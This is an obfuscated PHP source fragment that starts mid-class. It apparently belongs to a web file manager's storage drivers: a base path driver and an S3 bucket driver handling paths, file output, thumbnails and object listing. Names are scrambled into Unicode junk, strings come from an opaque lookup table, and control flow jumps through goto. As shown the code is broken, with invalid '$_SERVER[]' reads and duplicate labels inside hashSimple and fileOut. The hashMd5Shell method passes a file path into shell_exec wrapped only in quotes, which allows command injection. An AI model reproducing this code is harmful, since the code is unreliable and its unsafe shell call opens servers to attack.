c: } private function recycleMove($cΗ, $aӅĊ = 1) { $B =& $_SERVER[]; $f« = Model($B[1097]); $c߆҇ = Model($B[2325]); $DÊ = array($B[365] => $cΗ); if ($aӅĊ) { $f«->where($DÊ)->setField($B[393], 1); $c߆҇->eventRecycle($cΗ, $B[2326]); } else { $A = $f«->where($DÊ)->find(); $e = $A[$B[366]] == $B[83]; $BŎѐ = $f«->fileNameAuto($A[$B[457]], $A[$B[28]], REPEAT_RENAME_FOLDER, $e); if ($BŎѐ != $A[$B[28]]) { $f«->rename($cΗ, $BŎѐ); } $f«->where($DÊ)->setField($B[393], 0); $c߆҇->eventRecycle($cΗ, $B[2327]); } } } goto BꝪފ; d: define($_SERVER[][1896], 1); define($_SERVER[][1897], 2); define($_SERVER[][1898], 3); goto aǲ; AԫӘ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Aĳ =& $_SERVER[]; $this->objectDriver = array($Aĳ[57], $Aĳ[58], $Aĳ[59], $Aĳ[60], $Aĳ[61], $Aĳ[62], $Aĳ[63], $Aĳ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Fû) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Fû, $_SERVER[][8]); } return $Fû; } public function getPathName($f݊) { return $f݊; } public function iconvApp($Bۨ) { return $Bۨ; } public function iconvSystem($c) { return $c; } public function iconvTo($e˃, $B̾, $bǄ̂) { goto F; fں: $AÃُ = $AÃُ ? $AÃُ : $e˃; if (strstr($AÃُ, $e[69])) { $AÃُ = str_replace($e[69], $e[70], $AÃُ); } $fĄ[$B̾ . $e[66] . $bǄ̂ . $e[67] . $e˃] = $AÃُ; goto A; b: $e = $B̾ . $e[66] . $bǄ̂ . $e[67] . $e˃; if (isset($fĄ[$e])) { return $fĄ[$e]; } if (function_exists($e[68])) { $AÃُ = @mb_convert_encoding($e˃, $bǄ̂, $B̾); } else { $AÃُ = @iconv($B̾, $bǄ̂, $e˃); } goto fں; A: $fĄ[$bǄ̂ . $e[66] . $B̾ . $e[67] . $e˃] = $e˃; $fĄ[$bǄ̂ . $e[66] . $B̾ . $e[67] . $AÃُ] = $e˃; $fĄ[$B̾ . $e[66] . $bǄ̂ . $e[67] . $AÃُ] = $AÃُ; goto Fȋ; F: $e =& $_SERVER[]; if (!$e˃ || !function_exists($e[65])) { return $e˃; } static $fĄ = array(); goto b; Fȋ: return $AÃُ; goto a; a: } public function getPathInner($E햄) { $aը = IO::init($E햄); return $aը->path; } public function getPathOuter($B􌠄) { $Cƭ =& $_SERVER[]; $A϶ض = strlen(trim($this->pathBase, $Cƭ[8])); $B􌠄 = substr(trim($B􌠄, $Cƭ[8]), $A϶ض); return $this->pathDriver . $Cƭ[8] . ltrim($B􌠄, $Cƭ[8]); } public function isParentOf($F管ȏ, $cԥ) { $E΄ϝ =& $_SERVER[]; $F管ȏ = rtrim(strtolower($F管ȏ), $E΄ϝ[8]) . $E΄ϝ[8]; $cԥ = rtrim(strtolower($cԥ), $E΄ϝ[8]) . $E΄ϝ[8]; $Eǘ = strpos($cԥ, $F管ȏ) === 0; return $Eǘ; } public function getType() { $D =& $_SERVER[]; $aͧ = str_replace($D[71], $D[33], get_class($this)); return strtolower($aͧ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($b, $E) { $a̧ =& $_SERVER[]; $a = rtrim($b, $a̧[8]) . $a̧[8] . $E; $b = $this->exist($a); return $b ? $a : !1; } public function renameObject($bڸ, $eЎਢ) { goto D; Eߪ: return $bČ؂ ? $eЎਢ : !1; goto f뙊; D: $e۽ =& $_SERVER[]; $bԏժ = $eЎਢ; Hook::trigger($e۽[72], $this, $bڸ, $this, $this->pathFather($bڸ) . $eЎਢ); goto bҖ; bҖ: $bڸ = $this->getPathOuter($bڸ); $eЎਢ = $this->pathFather($bڸ) . $eЎਢ; if (IO::isFile($bڸ)) { $bČ؂ = IO::copy($bڸ, $this->pathFather($bڸ), REPEAT_RENAME_FOLDER, $bԏժ); if ($bČ؂) { IO::remove($bڸ); } } else { $bČ؂ = IO::mkdir($eЎਢ); if (!$bČ؂) { return !1; } $C׃ = IO::listPath($bڸ, !0); $aԴ = array_merge($C׃[$e۽[73]], $C׃[$e۽[74]]); foreach ($aԴ as $E) { IO::move($E[$e۽[75]], $eЎਢ, REPEAT_RENAME_FOLDER); } IO::remove($bڸ); } goto Eߪ; f뙊: } public function tempFile($Eѹ = '', $F = '') { goto f妑; e: $E، = $E勶 . $Eѹ; @touch($E،); if ($F) { file_put_contents($E،, $F); } goto bտ; f妑: if (!$Eѹ) { $Eѹ = rand_string(15); } $E勶 = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($E勶, 511, !0); goto e; bտ: return $E،; goto cΟ; cΟ: } public function tempFileRemve($e) { @unlink($e); @rmdir($this->pathFather($e)); } public function mkfile($Bɭ, $d = '', $E֞ = REPEAT_RENAME) { } public function mkdir($dǝ״, $cߚ = REPEAT_SKIP) { } public function copyFile($a, $eҘ) { } public function moveFile($cӊ̱, $Eŵ) { } public function remove($eӆ) { if ($this->isFile($eӆ)) { return $this->delFile($eӆ); } return $this->delFolder($eӆ); } public function rename($aцĠѰ, $d) { } public function exist($A) { } public function findByHash($d = '', $Aȉ = '') { return !1; } public function isFile($eŠ) { } public function isFolder($F׸ڌ) { } public function size($bޠ) { } public function info($bҘ궾) { } public function infoSimple($c؃) { return $this->info($c؃); } public function infoAuth($aΊ) { return $this->info($aΊ); } public function infoFull($dƋ) { return $this->info($dƋ); } public function infoWithChildren($Bş) { $f̓ =& $_SERVER[]; $Dˡ = $this->info($Bş); if ($Dˡ && $Dˡ[$f̓[29]] == $f̓[76]) { $D = array($f̓[77] => 0, $f̓[78] => 0, $f̓[79] => 0); $this->infoChildren($Bş, $D); $Dˡ[$f̓[77]] = $D[$f̓[77]]; $Dˡ[$f̓[80]] = array($f̓[81] => $D[$f̓[78]], $f̓[82] => $D[$f̓[79]]); } return $Dˡ; } public function listPath($DϾ, $F = false) { } public function has($d鍴Ϊ, $A߷ = false, $F = false) { } public function canRead($C) { } public function canWrite($c狲) { } public function getContent($Fᘍ) { } public function setContent($eψ, $eӎ = '') { } protected function infoChildren($E, &$B) { $dܩϦ =& $_SERVER[]; check_abort(); $EĒ = $this->listPath($E, !0); $EĒ = array_merge($EĒ[$dܩϦ[74]], $EĒ[$dܩϦ[73]]); foreach ($EĒ as $d) { if ($d[$dܩϦ[29]] == $dܩϦ[76]) { $B[$dܩϦ[79]]++; $Dڋ = $this->getPathInner($d[$dܩϦ[75]]); $this->infoChildren($Dڋ, $B); } else { $B[$dܩϦ[78]]++; $B[$dܩϦ[77]] += $d[$dܩϦ[77]]; } } } public function fileSubstr($Fҡʚ, $Eꪪ, $B) { } public function listAll($b۠) { } public function upload($cȖ, $bҳʙ, $Eۮг = false, $e = REPEAT_REPLACE) { } public function uploadFileByID($fߑщ, $cц, $eЪՃ) { } public function uploadFileByPath($f៉, $A܏, $eĥӄ = array()) { } public function isUploadServer() { $F۟ =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $F۟[83]) { return !0; } return $GLOBALS[$F۟[6]][$F۟[84]][$F۟[85]]; } public function isFileOutServer() { $F̳Ƶ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $F̳Ƶ[83]) { return !0; } return $GLOBALS[$F̳Ƶ[6]][$F̳Ƶ[84]][$F̳Ƶ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eɱɈ) { $A =& $_SERVER[]; if (!$this->isCdnHost()) { return $eɱɈ; } return str_replace(trim(get_url_root($eɱɈ), $A[8]), trim($this->cdnHost, $A[8]), $eɱɈ); } public function uploadLink($D, $FϘ = 0) { goto EŇ; EŇ: $fǫ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $dɮ = $this->getType(); goto dЪ; dЪ: if (!in_array($dɮ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $B؏ = 1024 * 1024 * 10; goto f; E: if ($E) { $E[$fǫ[89]] = $D; $E[$fǫ[90]] = $dɮ; } return $E; goto eㅄ; f: $EųƸ = $FϘ <= $B؏ ? $fǫ[87] : $fǫ[88]; $cߙ = (!$FϘ ? 1 : ceil($FϘ / pow(1024, 3))) * 3600 * 4; $E = $this->{$EųƸ}($D, $cߙ); goto E; eㅄ: } public function uploadFormData($e, $BȊ詉 = 3600) { } public function multiUploadFormData($FѮΎ, $a뱯 = 3600) { } public function download($dᕞ¯, $Eװݩ) { } public function ext($Aۻ) { $f攌 =& $_SERVER[]; if (strpos($Aۻ, $f攌[8]) === -1) { $b = $Aۻ; } else { $b = $this->pathThis($Aۻ); } $d = $f攌[33]; if (strstr($b, $f攌[91])) { $d = substr($b, strrpos($b, $f攌[91]) + 1); $d = strtolower($d); } if (strlen($d) > 3 && preg_match($f攌[92], $d, $e)) { $d = $f攌[33]; } return $d; } public function pathThis($aРƾ) { $Fח =& $_SERVER[]; $aРƾ = str_replace($Fח[93], $Fח[8], rtrim($aРƾ, $Fח[8])); $B = strrpos($aРƾ, $Fח[8]); if ($B === !1) { return $aРƾ; } return substr($aРƾ, $B + 1); } public function pathFather($eۅ) { $eㄆ =& $_SERVER[]; $eۅ = str_replace($eㄆ[93], $eㄆ[8], rtrim($eۅ, $eㄆ[8])); $d = strrpos($eۅ, $eㄆ[8]); if ($d === !1) { return $eㄆ[33]; } return substr($eۅ, 0, $d + 1); } public function hashSimple($a½챏) { goto C; C: $b =& $_SERVER[]; if (!$a½챏) { return md5($b[33]); } $Fއ읦 = $this->size($a½챏); goto E; C: $eǖ = intval($Fއ읦 / $Eߦ); $aʅɶ = $b[33]; for ($aё = 0; $aё < $Eߦ; $aё++) { $aʅɶ .= $this->fileSubstr($a½챏, $eǖ * $aё, $DԖߎ); } goto E; E: $DԖߎ = 200; $Eߦ = 50; if ($Fއ읦 <= $DԖߎ * $Eߦ) { return $this->hashMd5($a½챏) . $Fއ읦; } goto C; E: $aʅɶ .= $this->fileSubstr($a½챏, $Fއ읦 - $DԖߎ, $DԖߎ); return md5($aʅɶ) . $Fއ읦; goto DԔƈ; DԔƈ: } public static $md5Cache = array(); public function hashMd5($d߅) { $d߅ = $this->iconvSystem($d߅); if (isset(self::$md5Cache[$d߅])) { return self::$md5Cache[$d߅]; } self::$md5Cache[$d߅] = $this->hashMd5Shell($d߅); if (!self::$md5Cache[$d߅]) { self::$md5Cache[$d߅] = @md5_file($d߅); } return self::$md5Cache[$d߅]; } private function hashMd5Shell($e갡) { goto Eބ; fۺ: $cȣ = shell_exec($Bӯ萏 . "\40\x22{$e갡}\x22"); return substr($cȣ, 0, 32); goto Dޔ; B쐑: $Bӯ萏 = Cache::get($Fݴ[97]); if (!$Bӯ萏) { $DŽŞ = BASIC_PATH . $Fݴ[98]; $dʅѦ = md5_file($DŽŞ); $Bӯ萏 = $Fݴ[99]; foreach ($Aι as $D) { $cȣ = shell_exec($D . "\40\x22{$DŽŞ}\x22"); if ($cȣ && substr(trim($cȣ), 0, 32) == $dʅѦ) { $Bӯ萏 = $D; break; } } Cache::set($Fݴ[97], $Bӯ萏, 3600); } if ($Bӯ萏 == $Fݴ[99]) { return !1; } goto fۺ; Eބ: $Fݴ =& $_SERVER[]; if (!function_exists($Fݴ[94])) { return !1; } $Aι = array($Fݴ[95], $Fݴ[96]); goto B쐑; Dޔ: } public function link($A낉) { return $A낉; } public function fileOut($D, $Cޟ = false, $E臥 = false, $EԱ = '') { goto c; c: $Cֲ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$D || !$this->exist($D)) { show_json(LNG($Cֲ[100]), !1, $E臥); } goto E; C: header($Cֲ[131] . $a . $Cֲ[123]); header($Cֲ[132] . $Eҹд); header($Cֲ[133]); goto E; a: if (isset($_SERVER[$Cֲ[127]]) && strtotime($_SERVER[$Cֲ[127]]) == $BΉП[$Cֲ[106]]) { header($Cֲ[128], !0, 304); die; } if (isset($_SERVER[$Cֲ[129]]) && $_SERVER[$Cֲ[129]] == $EԱ) { header($Cֲ[130] . $EԱ, !0, 304); die; } header($Cֲ[130] . $EԱ); goto C; a⅚: $Aģ = get_file_mime($Bʸ); if (strstr($Aģ, $Cֲ[113])) { $Aģ = $Aģ . $Cֲ[114]; } if ($Cޟ === !1 && !mime_support($Aģ)) { $Cޟ = !0; $Aģ = $Cֲ[115]; } goto eÑ; Eͥ: header($Cֲ[120]); header($Cֲ[121] . $Aģ); header($Cֲ[122] . gmdate($Cֲ[105], time() + 3600 * 24 * 30) . $Cֲ[123]); goto f; E: $eƉ = $this->getType() == $Cֲ[101]; $a = $GLOBALS[$Cֲ[6]][$Cֲ[84]][$Cֲ[102]][$Cֲ[103]]; $b̒ = (double) $GLOBALS[$Cֲ[6]][$Cֲ[84]][$Cֲ[102]][$Cֲ[104]] * 1024 * 1024; goto eΡ専; f: header($Cֲ[124]); header($Cֲ[125]); header($Cֲ[126]); goto a; eΡ専: @ob_end_clean(); set_timeout(); $BΉП = $this->infoFull($D); goto D; aņ썍: $dی = 0; if ($b̒) { $dی = intval(1000 * 1000 * ($cӶ / $b̒)); } while ($C <= $e铐) { $bѠ = timeFloat(); check_abort(); $dǝ = $e铐 - $C + 1; if ($dǝ <= $cӶ) { $cӶ = $dǝ; } echo $this->fileSubstr($D, $C, $cӶ); $C += $cӶ; if ($cӶ == $dǝ) { $C = $e铐 + 1; } if ($dی) { $a҆ț = intval(1000 * 1000 * (timeFloat() - $bѠ)); $B = $dی - $a҆ț; if ($B > 5) { usleep($B); } } } goto E; fԩ: if (in_array($Bʸ, array($Cֲ[107], $Cֲ[108], $Cֲ[109], $Cֲ[110]))) { $Bʸ = $Cֲ[111]; } if (!$EԱ) { $EԱ = md5($a . $this->hashSimple($D)); } $EԱ = $Cֲ[112] . $EԱ . $Cֲ[112]; goto a⅚; F좐: $Dɋ = strtolower($_SERVER[$Cֲ[137]]); if ($eƉ && $Dɋ && $a) { if (strstr($Dɋ, $Cֲ[138])) { header($Cֲ[139] . $D); } else { if (strstr($Dɋ, $Cֲ[140])) { header($Cֲ[141] . $D); } else { if (strstr($Dɋ, $Cֲ[142])) { header($Cֲ[143] . $D); } } } if ($b̒) { header($Cֲ[144] . $b̒); } return; } if (isset($_SERVER[$Cֲ[145]])) { if (preg_match($Cֲ[146], $_SERVER[$Cֲ[145]], $fظ͂)) { $C = intval($fظ͂[1]); if (!empty($fظ͂[2])) { $e铐 = intval($fظ͂[2]); } } header($Cֲ[147]); header("\x43\157\x6e\164\x65\x6e\x74\55\122\x61\x6e\x67\145\72\x20\x62\171\164\145\163\40{$C}\x2d{$e铐}\x2f" . $A܍); } else { header($Cֲ[148]); } goto B܊ϩ; D: $A܍ = $BΉП[$Cֲ[77]]; $a = gmdate($Cֲ[105], $BΉП[$Cֲ[106]]); $Eҹд = $E臥 ? $E臥 : $this->iconvApp($BΉП[$Cֲ[28]]); goto a􈬛; E: header($Cֲ[134] . $A܍); header($Cֲ[135]); if (!$Cޟ && $Bʸ == $Cֲ[136]) { if ($A܍ > 1024 * 1024 * 5) { die; } $fȈ = $this->getContent($D); $fȈ = Html::clearSVG($fȈ); echo $fȈ; die; } goto F좐; eÑ: $E媇 = rawurlencode($Eҹд); $E媇 = $Cֲ[112] . $E媇 . $Cֲ[116] . $E媇; if ($Cޟ) { header($Cֲ[117]); header($Cֲ[118] . $E媇); } else { header($Cֲ[119] . $E媇); } goto Eͥ; B܊ϩ: header($Cֲ[149] . ($e铐 - $C + 1)); if ($_SERVER[$Cֲ[150]] == $Cֲ[151]) { return; } $cӶ = 1024 * 100; goto aņ썍; a􈬛: $C = 0; $e铐 = $A܍ - 1; $Bʸ = $this->ext($Eҹд); goto fԩ; E: } public function fileOutServer($fӣ, $B׉ = false, $bƧ = false, $e = '') { $this->fileOut($fӣ, $B׉, $bƧ, $e); } public function fileOutLink($aڭ) { header($_SERVER[][152] . $aڭ); die; } public function cacheMethod($F҅ĩ, $cߞٿ) { goto F⮲ŏ; a爅: if (!is_null($b³)) { return $b³; } $b³ = $this->{$F҅ĩ}($cߞٿ); $F[$A͚] = $b³; goto fܛ; bތӐ: if (is_null($F҅ĩ)) { $F = array(); return; } if (is_null($cߞٿ)) { unset($F[$A͚]); return; } $b³ = isset($F[$A͚]) ? $F[$A͚] : null; goto a爅; fܛ: return $b³; goto d; F⮲ŏ: $e㷥 =& $_SERVER[]; static $F = array(); $A͚ = $e㷥[153] . $F҅ĩ . $e㷥[154] . rtrim($cߞٿ, $e㷥[8]); goto bތӐ; d: } public function fileOutImage($B僄, $Aѳ = 250) { goto Aݰ; C: $D򲞊 = DATA_THUMB . $fי; if (!@file_exists($D򲞊)) { $a = TEMP_FILES; if (!is_dir($a)) { mk_dir($a); } $e꙾ = $a . $Aʃ . $e粒[91] . $E먎[$e粒[156]]; if (!@file_exists($e꙾)) { $e꙾ = $this->download($B僄, $e꙾); } $Fタ = new ImageThumb($e꙾, $e粒[163]); $Fタ->prorate($D򲞊, $Aѳ, $Aѳ * 10); } if (!file_exists($D򲞊) || filesize($D򲞊) < 100) { return @file_exists($e꙾) ? IO::fileOut($e꙾) : $this->fileOut($B僄); } goto Aɍ; Cͽ: if (!($CӸ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $e粒[161]))) { $e񋞡 = IO::mkdir(IO_PATH_SYSTEM_TEMP . $e粒[162]); } else { $e񋞡 = KodIO::make($CӸ); } if ($CӸ = IO::fileNameExist($e񋞡, $fי)) { $D򲞊 = KodIO::make($CӸ); return IO::fileOut($D򲞊); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto C; Aݰ: $e粒 =& $_SERVER[]; if (substr($B僄, 0, 4) == $e粒[142]) { $this->fileOutLink($B僄); } $E먎 = $this->info($B僄); goto BՅ; BՅ: if ($E먎[$e粒[77]] <= 1024 * 50 || !function_exists($e粒[155]) || $E먎[$e粒[156]] == $e粒[157]) { return $this->fileOut($B僄); } if (isset($E먎[$e粒[158]][$e粒[159]])) { $Aʃ = $E먎[$e粒[158]][$e粒[159]]; } else { if (isset($E먎[$e粒[158]][$e粒[160]])) { $Aʃ = $E먎[$e粒[158]][$e粒[160]]; } else { $Aʃ = md5("{$E먎[$e粒[28]]}\x5f{$E먎[$e粒[75]]}\137{$E먎[$e粒[77]]}"); } } $fי = "{$Aʃ}\x5f{$Aѳ}\56\160\x6e\147"; goto Cͽ; Aɍ: if (!($A¾ = IO::move($D򲞊, $e񋞡))) { return IO::fileOut($D򲞊); } del_file($D򲞊); IO::fileOut($A¾); goto Dň; Dň: } public function fileOutImageServer($D, $F؄ = 250) { $this->fileOutImage($D, $F؄); } public function fileNameAuto($EퟆԐ, $d, $b = REPEAT_RENAME, $FЭ = false) { goto EĆՇ; F՚: while ($this->exist(rtrim($EퟆԐ, $aÅ[8]) . $aÅ[8] . $Dơꗍ)) { $Dơꗍ = $E췭 . "\x28{$CΧĠ}\x29{$dꋞ}"; $CΧĠ++; } return $Dơꗍ; goto Aɇ; f߽: $CΧĠ = 1; $E췭 = substr($d, 0, strlen($d) - strlen($dꋞ)); $Dơꗍ = $E췭 . "\x28{$CΧĠ}\x29{$dꋞ}"; goto F՚; EĆՇ: $aÅ =& $_SERVER[]; $eԘ = $EퟆԐ === $aÅ[33] ? $d : rtrim($EퟆԐ, $aÅ[8]) . $aÅ[8] . $d; if ($b == REPEAT_REPLACE || !$this->exist($eԘ) || $FЭ && $b != REPEAT_RENAME_FOLDER) { return $d; } goto dј; dј: if ($b == REPEAT_SKIP) { return !1; } $dꋞ = $aÅ[91] . get_path_ext($d); $dꋞ = $dꋞ == $aÅ[91] || $FЭ ? $aÅ[33] : $dꋞ; goto f߽; Aɇ: } public function listAllFiles($cƒ, $D, $E˥޶ = array()) { goto fȿƾ; B: $cƒ = trim($cƒ, $E[8]); foreach ($D as $aԿԚ) { $f謣 = ltrim(substr($aԿԚ, strlen($cƒ)), $E[8]); $d񐊺 = array_merge($d񐊺, $this->slicePath($f謣)); } $Bӏ֧ = array(); goto cݏ; fȿƾ: $E =& $_SERVER[]; if (empty($D)) { return array(); } $d񐊺 = array(); goto B; cݏ: foreach (array_unique($d񐊺) as $aԿԚ) { $BŠ՘Ǡ = array($E[75] => $this->getPathOuter($E[8] . $cƒ . $E[8] . $aԿԚ), $E[76] => 1, $E[77] => 0); if (substr($aԿԚ, -1) != $E[8]) { $BŠ՘Ǡ[$E[76]] = 0; $fӫ = $this->getPath($cƒ . $E[8] . $aԿԚ); $BŠ՘Ǡ[$E[77]] = isset($E˥޶[$fӫ]) ? $E˥޶[$fӫ] : $this->size($fӫ); } $Bӏ֧[] = $BŠ՘Ǡ; } return $Bӏ֧; goto e; e: } public function slicePath($f) { $B⚛ =& $_SERVER[]; $fο = explode($B⚛[8], trim($f, $B⚛[8])); $Fҧ = 0; do { ++$Fҧ; $b[] = implode($B⚛[8], array_slice($fο, 0, $Fҧ)) . $B⚛[8]; } while ($Fҧ < count($fο)); $b[count($fο) - 1] = $f; return $b; } public function getHost() { $fٶ =& $_SERVER[]; $AƮ = parse_url(trim($this->domain, $fٶ[8])); $F쭍 = isset($AƮ[$fٶ[164]]) ? $AƮ[$fٶ[164]] : http_type(); $c = isset($AƮ[$fٶ[165]]) ? $AƮ[$fٶ[165]] : $AƮ[$fٶ[75]]; if (isset($AƮ[$fٶ[166]])) { $c .= $fٶ[4] . $AƮ[$fٶ[166]]; } return $F쭍 . $fٶ[167] . $c; } public function pathEncode($Aƭ) { $C =& $_SERVER[]; return str_replace($C[168], $C[8], rawurlencode($Aƭ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($A걽) { set_timeout(); require_once SDK_DIR . $_SERVER[][169]; parent::__construct(); $this->_init($A걽); } public function _init($C) { foreach ($C as $b҄ => $dΡ) { if (isset($this->{$b҄})) { $this->{$b҄} = $dΡ; } } $this->endpoint = $C[$_SERVER[][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($A㌚ = "\166\x34") { $this->signVer = $A㌚; $this->client->setSignatureVersion($A㌚); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto F˄켄; E: if ($D脵[$fޏϭ[171]] != $fޏϭ[172] || $D脵[$fޏϭ[173]] != $fޏϭ[172]) { return !1; } $B׼ = array_map($fޏϭ[174], $D脵[$fޏϭ[175]]); if (!is_array($B׼)) { $B׼ = array(); } goto B; F˄켄: $fޏϭ =& $_SERVER[]; $D脵 = $this->getBucketCors(); if (!$D脵 || !is_array($D脵)) { return !1; } goto E; B: $fږ = array($fޏϭ[176], $fޏϭ[177], $fޏϭ[178], $fޏϭ[179], $fޏϭ[180]); $fُ = array_diff($fږ, $B׼); return empty($fُ); goto d֩; d֩: } public function mkfile($Eަء, $Fϔ葋 = '', $Bڲ = REPEAT_RENAME) { $fێڌ = $this->setContent($Eަء, $Fϔ葋); if ($fێڌ !== !1) { return $this->getPathOuter($Eަء); } return !1; } public function mkdir($Eƶʘ, $a㠽 = REPEAT_SKIP) { if (empty($Eƶʘ)) { return !1; } if ($this->_isFolder($Eƶʘ)) { return $this->getPathOuter($Eƶʘ); } $Eǖ = $this->setContent($Eƶʘ, $_SERVER[][33], !0); if ($Eǖ !== !1) { return $this->getPathOuter($Eƶʘ); } return !1; } public function copyFile($E␖, $a, $D߰ = array()) { $f =& $_SERVER[]; $b = $this->objectMeta($E␖); if (!$b) { return !1; } if ($b[$f[77]] <= 1024 * 1024 * 200) { $d = $this->client->copyObject($this->bucket, $E␖, $this->bucket, $a, $f[181], $D߰); } else { $d = $this->client->multiCopyObject($this->bucket, $E␖, $this->bucket, $a, $D߰); } $d = $d ? $this->getPathOuter($a) : !1; return $d; } public function moveFile($E٪, $A) { if ($this->copyFile($E٪, $A)) { $this->delFile($E٪); return $this->getPathOuter($A); } return !1; } public function delFile($cڂ) { return $this->client->deleteObject($this->bucket, $cڂ); } public function delFolder($Bǂ) { goto eݨ; Dڞ: $B = $eП = 0; $d۹ = array_chunk(array_keys($cۋĳ), 1000); foreach ($d۹ as $Aφ) { $B++; $eП += (int) $this->client->deleteObjects($this->bucket, $Aφ); } goto A; eݨ: $D戍 =& $_SERVER[]; $cۋĳ = $this->listObjs($Bǂ); if (!$cۋĳ) { $Bǂ = trim($Bǂ, $D戍[8]); if (!empty($Bǂ)) { $Bǂ .= $D戍[8]; } return $this->delFile($Bǂ); } goto Dڞ; A: return $B === $eП ? !0 : !1; goto aå; aå: } public function rename($cނ, $A㠊) { return $this->renameObject($cނ, $A㠊); } public function listPath($B͚, $aʶӛ = false) { $f됏 =& $_SERVER[]; $B䌒ڪ = $this->listObjs($B͚, null, null, $f됏[8]); $Bґ = array($f됏[74] => array(), $f됏[73] => array()); foreach ($B䌒ڪ as $E܌Ƹ => $eЯ) { if ($E܌Ƹ == $f됏[8]) { continue; } if (isset($eЯ[$f됏[182]])) { $Bґ[$f됏[74]][] = $this->folderInfo($eЯ[$f됏[182]], $aʶӛ); } else { if (substr($eЯ[$f됏[28]], -1) == $f됏[8]) { continue; } $Bґ[$f됏[73]][] = $this->fileInfo($eЯ[$f됏[28]], $aʶӛ, $eЯ); } } return $Bґ; } private function fileInfo($aϿ, $bã = false, $C = array()) { goto bȒ; f: return $d; goto f񉔦ɇ; B: if (empty($C)) { $C = $this->objectMeta($aϿ); if (!$C) { return $d; } } if (isset($C[$Cʊħ[186]])) { $d[$Cʊħ[106]] = $C[$Cʊħ[186]]; } if (isset($C[$Cʊħ[77]])) { $d[$Cʊħ[77]] = $C[$Cʊħ[77]]; } goto f; bȒ: $Cʊħ =& $_SERVER[]; if ($bã) { return array($Cʊħ[28] => $this->pathThis($aϿ), $Cʊħ[75] => $this->getPathOuter($aϿ), $Cʊħ[29] => $Cʊħ[163], $Cʊħ[156] => $this->ext($aϿ), $Cʊħ[77] => isset($C[$Cʊħ[77]]) ? $C[$Cʊħ[77]] : 0, $Cʊħ[183] => 0, $Cʊħ[106] => 0, $Cʊħ[184] => !0, $Cʊħ[185] => !0); } $d = array($Cʊħ[28] => $this->pathThis($aϿ), $Cʊħ[75] => $this->getPathOuter($aϿ), $Cʊħ[29] => $Cʊħ[163], $Cʊħ[183] => 0, $Cʊħ[106] => 0, $Cʊħ[77] => 0, $Cʊħ[156] => $this->ext($aϿ), $Cʊħ[184] => !0, $Cʊħ[185] => !0); goto B; f񉔦ɇ: } private function folderInfo($C䍫, $Eڤːޖ = false) { goto aЃ෺; cϲ: if ($C䍫 == $Bͱ[33]) { return $Fԍ; } $C䍫 = trim($C䍫, $Bͱ[8]) . $Bͱ[8]; $fΕ = $this->objectMeta($C䍫); goto b˚; b˚: if (isset($fΕ[$Bͱ[186]])) { $Fԍ[$Bͱ[183]] = $fΕ[$Bͱ[186]]; } return $Fԍ; goto eș; aЃ෺: $Bͱ =& $_SERVER[]; if ($Eڤːޖ) { return array($Bͱ[28] => $this->pathThis($C䍫), $Bͱ[75] => $this->getPathOuter($Bͱ[8] . $C䍫), $Bͱ[29] => $Bͱ[76], $Bͱ[184] => !0, $Bͱ[185] => !0); } $Fԍ = array($Bͱ[28] => $this->pathThis($C䍫), $Bͱ[75] => $this->getPathOuter($Bͱ[8] . $C䍫), $Bͱ[29] => $Bͱ[76], $Bͱ[183] => 0, $Bͱ[106] => 0, $Bͱ[184] => !0, $Bͱ[185] => !0); goto cϲ; eș: } public function listObjs($fގმ, $eˋ = null, $aê֖ݢ = null, $b״ = null) { $a؉ =& $_SERVER[]; $fގმ = trim($fގმ, $a؉[8]); $Fё = empty($fގმ) ? $a؉[33] : $fގმ . $a؉[8]; return $this->client->getBucket($this->bucket, $Fё, $eˋ, $aê֖ݢ, $b״, !0); } public function has($F͜, $bթ = false, $eԏ״ = true) { goto b; b: $Bެ =& $_SERVER[]; $a궕Ύ = 0; $Bܛ = 0; goto F; fھͽ: if ($bթ) { return array($Bެ[187] => $a궕Ύ, $Bެ[188] => $Bܛ); } return !1; goto dϚ; F: $D״ = $this->listObjs($F͜, null, null, $Bެ[8]); $D״ = is_array($D״) ? $D״ : array(); foreach ($D״ as $e) { if (isset($e[$Bެ[28]]) && substr($e[$Bެ[28]], -1) != $Bެ[8]) { if (!$bթ && $eԏ״) { return !0; } $a궕Ύ++; } else { if (isset($e[$Bެ[182]])) { if (!$bթ && !$eԏ״) { return !1; } $Bܛ++; } } } goto fھͽ; dϚ: } public function listAll($EÅڞ) { $e =& $_SERVER[]; $Fק = $this->listObjs($EÅڞ); $bэތ = $d = array(); foreach ($Fק as $Bֈ => $e裊) { $bэތ[] = $e裊[$e[28]]; $d[$Bֈ] = $e裊[$e[77]]; } return $this->listAllFiles($EÅڞ, $bэތ, $d); } public function canRead($bíȑ) { $Eމ =& $_SERVER[]; $dƮ = $this->client->getAccessControlPolicy($this->bucket, $bíȑ); if (!$dƮ) { return !1; } return in_array($dƮ, array($Eމ[189], $Eމ[190], $Eމ[191])) ? !0 : !1; } public function canWrite($Aګε) { $eƳ =& $_SERVER[]; $e٣§ = $this->client->getAccessControlPolicy($this->bucket, $Aګε); if (!$e٣§) { return !1; } return in_array($e٣§, array($eƳ[189], $eƳ[190])) ? !0 : !1; } public function getContent($A㊽) { 